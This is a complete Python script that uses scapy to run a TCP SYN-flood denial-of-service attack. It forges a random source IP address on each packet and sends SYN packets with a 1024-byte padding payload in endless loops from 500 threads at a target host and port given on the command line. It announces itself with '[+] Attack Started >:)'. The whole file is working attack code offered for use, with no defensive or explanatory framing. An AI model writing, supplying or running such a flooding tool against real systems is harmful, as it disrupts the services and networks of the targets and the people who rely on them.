#!/usr/bin/env python3

import socket,random,struct,threading
from scapy.layers.inet import IP,TCP,RandShort
from scapy.sendrecv import send
from scapy.packet import Raw
import sys


fake_ip =socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

target_ip =sys.argv[1]
target_port = sys.argv[2]


ip = IP(dst=target_ip,src=str(fake_ip))

tcp = TCP(sport=RandShort(),dport=int(target_port),flags="S")

raw = Raw(b'X'*1024)

p = ip / tcp / raw

print("[+] Attack Started >:)")

def attack():
    send(p,loop=1,verbose=0)


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()